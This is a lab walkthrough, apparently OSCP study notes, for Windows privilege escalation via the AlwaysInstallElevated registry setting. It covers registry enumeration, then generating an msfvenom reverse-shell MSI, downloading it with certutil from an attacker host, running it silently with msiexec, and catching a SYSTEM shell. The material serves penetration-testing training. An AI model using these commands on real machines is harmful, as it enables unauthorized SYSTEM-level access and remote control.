# LAB — Registry Attacks: AlwaysInstallElevated

> [!summary] Quick Recall
> `AlwaysInstallElevated` is a Windows Installer setting that allows **any `.msi` package to run with SYSTEM privileges**, regardless of which user executes it. This is the Windows equivalent of **SUID in Linux**. If both `HKLM` and `HKCU` keys are set to `1`, generate a malicious `.msi` payload → execute → instant **NT AUTHORITY\SYSTEM** shell.

---

## Concept

- Windows Installer Engine (MSI) normally requires elevated permissions to install software
- When `AlwaysInstallElevated` is enabled, `.msi` packages run with **elevated SYSTEM token**, bypassing UAC
- This allows non-admin users to install software — used in production for delegated software catalogs
- **Security implication:** Any `.msi` you execute runs as SYSTEM — no need to modify existing binaries

![](attachments/Pasted%20image%2020260925211617.png)

### Analogy

| Linux SUID | Windows AlwaysInstallElevated |
| ---------- | ----------------------------- |
| File runs as the **owner** regardless of who executes it | `.msi` runs with **SYSTEM token** regardless of who executes it |

### Vulnerable Condition

**BOTH** keys must be set to `1` (`0x1`):

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 0x1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 0x1
```

Additionally, `DisableMSI` should be `0` (`0x0`) so `.msi` execution is allowed.

---

## Enumeration

### Step 1: WinPEAS Check

```bash
grep -aiA 10 "AlwaysInstallElevated" windows.txt
```

**Example output:**

```
Checking AlwaysInstallElevated (T1548.002)
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

> WinPEAS confirms both keys are set but doesn't show the full Registry path — always verify manually.

### Step 2: Manual Registry Query

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**HKCU output:**

```
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

**HKLM output:**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

### Step 3: Verify DisableMSI is Not Blocking

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
    DisableMSI               REG_DWORD    0x0
```

> ✅ `AlwaysInstallElevated = 0x1` in **both** HKLM and HKCU
> ✅ `DisableMSI = 0x0` (MSI execution is allowed)
> → System is **vulnerable**!

## Exploitation

### Step 4: Generate MSI Reverse Shell Payload

On Kali (use [revshells.com](https://www.revshells.com/) → msfvenom → Windows Stageless Reverse TCP x64):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f msi > reverse.msi
```

> [!important]
> Use `-f msi` (not `-f exe`) to generate an MSI installer package.

### Step 5: Transfer Payload to Windows

```bash
# Kali — host payload
python3 -m http.server 8000
```

```cmd
:: Windows — download
certutil -f -urlcache http://<KALI_IP>:8000/reverse.msi reverse.msi
```

### Step 6: Start Listener on Kali

```bash
rlwrap -cAr nc -lvnp 4444
```

### Step 7: Execute the MSI

**Method 1 — Direct execution:**

```cmd
.\reverse.msi
```

**Method 2 — Silent execution with msiexec (if Method 1 fails):**

```cmd
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

| msiexec Flag | Meaning |
| ------------ | ------- |
| `/i`         | Install the specified MSI package |
| `/quiet`     | Run without user interaction |
| `/qn`        | No user interface at all |

> When run interactively, the MSI installer GUI may show "Preparing to install..." and eventually error out — but the reverse shell payload executes immediately under SYSTEM context regardless.

### Step 8: Catch the SYSTEM Shell

```
listening on [any] 4444 ...
connect to [192.168.163.199] from (UNKNOWN) [10.49.135.25] 49970
Microsoft Windows [Version 10.0.17763.737]

C:\Windows\system32>whoami
nt authority\system
```

**Privilege escalation to NT AUTHORITY\SYSTEM achieved!**

## Key Takeaways

| Point | Detail |
| ----- | ------ |
| Registry keys to check | `HKLM\...\Installer` AND `HKCU\...\Installer` |
| Vulnerable condition | `AlwaysInstallElevated = 0x1` in **both** keys |
| Also check | `DisableMSI = 0x0` (not disabled) |
| Payload format | `.msi` (not `.exe`) |
| msfvenom flag | `-f msi` |
| Execution | `.\payload.msi` or `msiexec /quiet /qn /i payload.msi` |
| Result | Shell as **NT AUTHORITY\SYSTEM** |
| No binary replacement needed | Any `.msi` you run gets SYSTEM privileges |

> [!tip] OSCP Relevance
> This vector appeared in actual **OSCP exam** machines. It is one of the quickest and most reliable wins when found — always check for it!

> [!note] Real-World Occurrence
> Rarely seen in hardened production environments, but common in staging setups, non-production servers, and CTF challenges.
